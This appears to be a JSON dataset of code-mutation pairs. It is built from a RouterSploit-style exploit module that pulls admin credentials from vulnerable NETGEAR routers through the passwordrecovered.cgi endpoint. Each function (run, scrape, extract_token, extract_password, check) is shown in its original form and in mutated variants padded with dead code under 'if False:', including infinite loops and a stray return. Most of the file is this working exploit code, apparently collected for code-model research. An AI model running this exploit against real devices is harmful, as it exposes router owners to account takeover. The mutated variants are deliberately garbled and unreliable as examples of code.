[
    {
        "func_name": "run",
        "original": "def run(self):\n    if self.check():\n        print_success('Target is vulnerable')\n        response = self.http_request(method='GET', path='/')\n        if response is not None:\n            model = response.headers.get('WWW-Authenticate')[13:-1]\n            token = self.extract_token(response.text)\n            if token is False:\n                token = 'routersploit'\n                print_status('Token not found')\n            else:\n                print_status('Token found: {}'.format(token))\n            response = self.http_request(method='GET', path='/currentsetting.htm')\n            fw_version = ''\n            if response is not None and response.status_code == 200:\n                fw_version = self.scrape(response.text, 'Firmware=', 'RegionTag').strip('\\r\\n')\n            print_status('Detected model: {} (FW: {})'.format(model, fw_version))\n            path = '/passwordrecovered.cgi?id={}'.format(token)\n            response = self.http_request(method='POST', path=path)\n            if response.text.find('left\">') != -1:\n                (username, password) = self.extract_password(response.text)\n                print_success('Exploit success! login: {}, password: {}'.format(username, password))\n            else:\n                print_error('Exploit failed. Could not extract credentials. Reboot your device and try again.')\n        else:\n            print_error('Exploit failed. Could not extract credentials.')\n    else:\n        print_error('Target is not vulnerable')",
        "mutated": [
            "def run(self):\n    if False:\n        i = 10\n    if self.check():\n        print_success('Target is vulnerable')\n        response = self.http_request(method='GET', path='/')\n        if response is not None:\n            model = response.headers.get('WWW-Authenticate')[13:-1]\n            token = self.extract_token(response.text)\n            if token is False:\n                token = 'routersploit'\n                print_status('Token not found')\n            else:\n                print_status('Token found: {}'.format(token))\n            response = self.http_request(method='GET', path='/currentsetting.htm')\n            fw_version = ''\n            if response is not None and response.status_code == 200:\n                fw_version = self.scrape(response.text, 'Firmware=', 'RegionTag').strip('\\r\\n')\n            print_status('Detected model: {} (FW: {})'.format(model, fw_version))\n            path = '/passwordrecovered.cgi?id={}'.format(token)\n            response = self.http_request(method='POST', path=path)\n            if response.text.find('left\">') != -1:\n                (username, password) = self.extract_password(response.text)\n                print_success('Exploit success! login: {}, password: {}'.format(username, password))\n            else:\n                print_error('Exploit failed. Could not extract credentials. Reboot your device and try again.')\n        else:\n            print_error('Exploit failed. Could not extract credentials.')\n    else:\n        print_error('Target is not vulnerable')",
            "def run(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    if self.check():\n        print_success('Target is vulnerable')\n        response = self.http_request(method='GET', path='/')\n        if response is not None:\n            model = response.headers.get('WWW-Authenticate')[13:-1]\n            token = self.extract_token(response.text)\n            if token is False:\n                token = 'routersploit'\n                print_status('Token not found')\n            else:\n                print_status('Token found: {}'.format(token))\n            response = self.http_request(method='GET', path='/currentsetting.htm')\n            fw_version = ''\n            if response is not None and response.status_code == 200:\n                fw_version = self.scrape(response.text, 'Firmware=', 'RegionTag').strip('\\r\\n')\n            print_status('Detected model: {} (FW: {})'.format(model, fw_version))\n            path = '/passwordrecovered.cgi?id={}'.format(token)\n            response = self.http_request(method='POST', path=path)\n            if response.text.find('left\">') != -1:\n                (username, password) = self.extract_password(response.text)\n                print_success('Exploit success! login: {}, password: {}'.format(username, password))\n            else:\n                print_error('Exploit failed. Could not extract credentials. Reboot your device and try again.')\n        else:\n            print_error('Exploit failed. Could not extract credentials.')\n    else:\n        print_error('Target is not vulnerable')",
            "def run(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    if self.check():\n        print_success('Target is vulnerable')\n        response = self.http_request(method='GET', path='/')\n        if response is not None:\n            model = response.headers.get('WWW-Authenticate')[13:-1]\n            token = self.extract_token(response.text)\n            if token is False:\n                token = 'routersploit'\n                print_status('Token not found')\n            else:\n                print_status('Token found: {}'.format(token))\n            response = self.http_request(method='GET', path='/currentsetting.htm')\n            fw_version = ''\n            if response is not None and response.status_code == 200:\n                fw_version = self.scrape(response.text, 'Firmware=', 'RegionTag').strip('\\r\\n')\n            print_status('Detected model: {} (FW: {})'.format(model, fw_version))\n            path = '/passwordrecovered.cgi?id={}'.format(token)\n            response = self.http_request(method='POST', path=path)\n            if response.text.find('left\">') != -1:\n                (username, password) = self.extract_password(response.text)\n                print_success('Exploit success! login: {}, password: {}'.format(username, password))\n            else:\n                print_error('Exploit failed. Could not extract credentials. Reboot your device and try again.')\n        else:\n            print_error('Exploit failed. Could not extract credentials.')\n    else:\n        print_error('Target is not vulnerable')",
            "def run(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    if self.check():\n        print_success('Target is vulnerable')\n        response = self.http_request(method='GET', path='/')\n        if response is not None:\n            model = response.headers.get('WWW-Authenticate')[13:-1]\n            token = self.extract_token(response.text)\n            if token is False:\n                token = 'routersploit'\n                print_status('Token not found')\n            else:\n                print_status('Token found: {}'.format(token))\n            response = self.http_request(method='GET', path='/currentsetting.htm')\n            fw_version = ''\n            if response is not None and response.status_code == 200:\n                fw_version = self.scrape(response.text, 'Firmware=', 'RegionTag').strip('\\r\\n')\n            print_status('Detected model: {} (FW: {})'.format(model, fw_version))\n            path = '/passwordrecovered.cgi?id={}'.format(token)\n            response = self.http_request(method='POST', path=path)\n            if response.text.find('left\">') != -1:\n                (username, password) = self.extract_password(response.text)\n                print_success('Exploit success! login: {}, password: {}'.format(username, password))\n            else:\n                print_error('Exploit failed. Could not extract credentials. Reboot your device and try again.')\n        else:\n            print_error('Exploit failed. Could not extract credentials.')\n    else:\n        print_error('Target is not vulnerable')",
            "def run(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    if self.check():\n        print_success('Target is vulnerable')\n        response = self.http_request(method='GET', path='/')\n        if response is not None:\n            model = response.headers.get('WWW-Authenticate')[13:-1]\n            token = self.extract_token(response.text)\n            if token is False:\n                token = 'routersploit'\n                print_status('Token not found')\n            else:\n                print_status('Token found: {}'.format(token))\n            response = self.http_request(method='GET', path='/currentsetting.htm')\n            fw_version = ''\n            if response is not None and response.status_code == 200:\n                fw_version = self.scrape(response.text, 'Firmware=', 'RegionTag').strip('\\r\\n')\n            print_status('Detected model: {} (FW: {})'.format(model, fw_version))\n            path = '/passwordrecovered.cgi?id={}'.format(token)\n            response = self.http_request(method='POST', path=path)\n            if response.text.find('left\">') != -1:\n                (username, password) = self.extract_password(response.text)\n                print_success('Exploit success! login: {}, password: {}'.format(username, password))\n            else:\n                print_error('Exploit failed. Could not extract credentials. Reboot your device and try again.')\n        else:\n            print_error('Exploit failed. Could not extract credentials.')\n    else:\n        print_error('Target is not vulnerable')"
        ]
    },
    {
        "func_name": "scrape",
        "original": "@staticmethod\ndef scrape(text, start_trig, end_trig):\n    if text.find(start_trig) != -1:\n        return text.split(start_trig, 1)[-1].split(end_trig, 1)[0]\n    else:\n        return False",
        "mutated": [
            "@staticmethod\ndef scrape(text, start_trig, end_trig):\n    if False:\n        i = 10\n    if text.find(start_trig) != -1:\n        return text.split(start_trig, 1)[-1].split(end_trig, 1)[0]\n    else:\n        return False",
            "@staticmethod\ndef scrape(text, start_trig, end_trig):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    if text.find(start_trig) != -1:\n        return text.split(start_trig, 1)[-1].split(end_trig, 1)[0]\n    else:\n        return False",
            "@staticmethod\ndef scrape(text, start_trig, end_trig):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    if text.find(start_trig) != -1:\n        return text.split(start_trig, 1)[-1].split(end_trig, 1)[0]\n    else:\n        return False",
            "@staticmethod\ndef scrape(text, start_trig, end_trig):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    if text.find(start_trig) != -1:\n        return text.split(start_trig, 1)[-1].split(end_trig, 1)[0]\n    else:\n        return False",
            "@staticmethod\ndef scrape(text, start_trig, end_trig):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    if text.find(start_trig) != -1:\n        return text.split(start_trig, 1)[-1].split(end_trig, 1)[0]\n    else:\n        return False"
        ]
    },
    {
        "func_name": "extract_token",
        "original": "@staticmethod\ndef extract_token(html):\n    return Exploit.scrape(html, 'unauth.cgi?id=', '\"')",
        "mutated": [
            "@staticmethod\ndef extract_token(html):\n    if False:\n        i = 10\n    return Exploit.scrape(html, 'unauth.cgi?id=', '\"')",
            "@staticmethod\ndef extract_token(html):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    return Exploit.scrape(html, 'unauth.cgi?id=', '\"')",
            "@staticmethod\ndef extract_token(html):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    return Exploit.scrape(html, 'unauth.cgi?id=', '\"')",
            "@staticmethod\ndef extract_token(html):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    return Exploit.scrape(html, 'unauth.cgi?id=', '\"')",
            "@staticmethod\ndef extract_token(html):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    return Exploit.scrape(html, 'unauth.cgi?id=', '\"')"
        ]
    },
    {
        "func_name": "extract_password",
        "original": "@staticmethod\ndef extract_password(html):\n    username = repr(Exploit.scrape(html, 'Router Admin Username</td>', '</td>'))\n    username = Exploit.scrape(username, '>', \"'\")\n    password = repr(Exploit.scrape(html, 'Router Admin Password</td>', '</td>'))\n    password = Exploit.scrape(password, '>', \"'\")\n    if username is False:\n        username = Exploit.scrape(html[html.find('left\">'):-1], 'left\">', '</td>')\n        password = Exploit.scrape(html[html.rfind('left\">'):-1], 'left\">', '</td>')\n    password = password.replace('&#35;', '#').replace('&#38;', '&')\n    return (username, password)",
        "mutated": [
            "@staticmethod\ndef extract_password(html):\n    if False:\n        i = 10\n    username = repr(Exploit.scrape(html, 'Router Admin Username</td>', '</td>'))\n    username = Exploit.scrape(username, '>', \"'\")\n    password = repr(Exploit.scrape(html, 'Router Admin Password</td>', '</td>'))\n    password = Exploit.scrape(password, '>', \"'\")\n    if username is False:\n        username = Exploit.scrape(html[html.find('left\">'):-1], 'left\">', '</td>')\n        password = Exploit.scrape(html[html.rfind('left\">'):-1], 'left\">', '</td>')\n    password = password.replace('&#35;', '#').replace('&#38;', '&')\n    return (username, password)",
            "@staticmethod\ndef extract_password(html):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    username = repr(Exploit.scrape(html, 'Router Admin Username</td>', '</td>'))\n    username = Exploit.scrape(username, '>', \"'\")\n    password = repr(Exploit.scrape(html, 'Router Admin Password</td>', '</td>'))\n    password = Exploit.scrape(password, '>', \"'\")\n    if username is False:\n        username = Exploit.scrape(html[html.find('left\">'):-1], 'left\">', '</td>')\n        password = Exploit.scrape(html[html.rfind('left\">'):-1], 'left\">', '</td>')\n    password = password.replace('&#35;', '#').replace('&#38;', '&')\n    return (username, password)",
            "@staticmethod\ndef extract_password(html):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    username = repr(Exploit.scrape(html, 'Router Admin Username</td>', '</td>'))\n    username = Exploit.scrape(username, '>', \"'\")\n    password = repr(Exploit.scrape(html, 'Router Admin Password</td>', '</td>'))\n    password = Exploit.scrape(password, '>', \"'\")\n    if username is False:\n        username = Exploit.scrape(html[html.find('left\">'):-1], 'left\">', '</td>')\n        password = Exploit.scrape(html[html.rfind('left\">'):-1], 'left\">', '</td>')\n    password = password.replace('&#35;', '#').replace('&#38;', '&')\n    return (username, password)",
            "@staticmethod\ndef extract_password(html):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    username = repr(Exploit.scrape(html, 'Router Admin Username</td>', '</td>'))\n    username = Exploit.scrape(username, '>', \"'\")\n    password = repr(Exploit.scrape(html, 'Router Admin Password</td>', '</td>'))\n    password = Exploit.scrape(password, '>', \"'\")\n    if username is False:\n        username = Exploit.scrape(html[html.find('left\">'):-1], 'left\">', '</td>')\n        password = Exploit.scrape(html[html.rfind('left\">'):-1], 'left\">', '</td>')\n    password = password.replace('&#35;', '#').replace('&#38;', '&')\n    return (username, password)",
            "@staticmethod\ndef extract_password(html):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    username = repr(Exploit.scrape(html, 'Router Admin Username</td>', '</td>'))\n    username = Exploit.scrape(username, '>', \"'\")\n    password = repr(Exploit.scrape(html, 'Router Admin Password</td>', '</td>'))\n    password = Exploit.scrape(password, '>', \"'\")\n    if username is False:\n        username = Exploit.scrape(html[html.find('left\">'):-1], 'left\">', '</td>')\n        password = Exploit.scrape(html[html.rfind('left\">'):-1], 'left\">', '</td>')\n    password = password.replace('&#35;', '#').replace('&#38;', '&')\n    return (username, password)"
        ]
    },
    {
        "func_name": "check",
        "original": "@mute\ndef check(self):\n    response = self.http_request(method='GET', path='/')\n    if response is not None:\n        header = response.headers.get('WWW-Authenticate')\n        token = self.extract_token(response.text)\n        return header is not None and 'NETGEAR' in header.upper() and (token is not False)\n    return False",
        "mutated": [
            "@mute\ndef check(self):\n    if False:\n        i = 10\n    response = self.http_request(method='GET', path='/')\n    if response is not None:\n        header = response.headers.get('WWW-Authenticate')\n        token = self.extract_token(response.text)\n        return header is not None and 'NETGEAR' in header.upper() and (token is not False)\n    return False",
            "@mute\ndef check(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    response = self.http_request(method='GET', path='/')\n    if response is not None:\n        header = response.headers.get('WWW-Authenticate')\n        token = self.extract_token(response.text)\n        return header is not None and 'NETGEAR' in header.upper() and (token is not False)\n    return False",
            "@mute\ndef check(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    response = self.http_request(method='GET', path='/')\n    if response is not None:\n        header = response.headers.get('WWW-Authenticate')\n        token = self.extract_token(response.text)\n        return header is not None and 'NETGEAR' in header.upper() and (token is not False)\n    return False",
            "@mute\ndef check(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    response = self.http_request(method='GET', path='/')\n    if response is not None:\n        header = response.headers.get('WWW-Authenticate')\n        token = self.extract_token(response.text)\n        return header is not None and 'NETGEAR' in header.upper() and (token is not False)\n    return False",
            "@mute\ndef check(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    response = self.http_request(method='GET', path='/')\n    if response is not None:\n        header = response.headers.get('WWW-Authenticate')\n        token = self.extract_token(response.text)\n        return header is not None and 'NETGEAR' in header.upper() and (token is not False)\n    return False"
        ]
    }
]